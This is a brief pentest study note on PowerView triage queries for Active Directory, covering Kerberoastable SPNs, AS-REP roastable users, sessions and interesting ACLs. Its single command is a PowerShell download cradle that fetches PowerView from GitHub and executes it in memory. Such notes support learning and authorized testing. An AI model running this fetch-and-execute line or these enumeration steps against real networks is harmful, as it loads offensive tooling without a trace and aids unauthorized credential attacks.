# 16.03 PowerView Triage Queries

> Run `Get-NetUser -SPN`, `Get-NetUser -PreauthNotRequired`, `Get-NetSession`, and `Find-InterestingDomainAcl` as fast LDAP triage.

## Overview

PowerView wraps LDAP queries into PowerShell cmdlets. Memorize Get-NetUser -SPN, Get-NetUser -PreauthNotRequired, Get-NetSession, Find-InterestingDomainAcl.

## Steps

- **Load PowerView** in-memory.
- **Triage by query** — DCs, trusts, kerberoastable SPNs, AS-REP roastable.
- **Cross-reference with BloodHound graph**.

## Commands

### Common queries

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
```
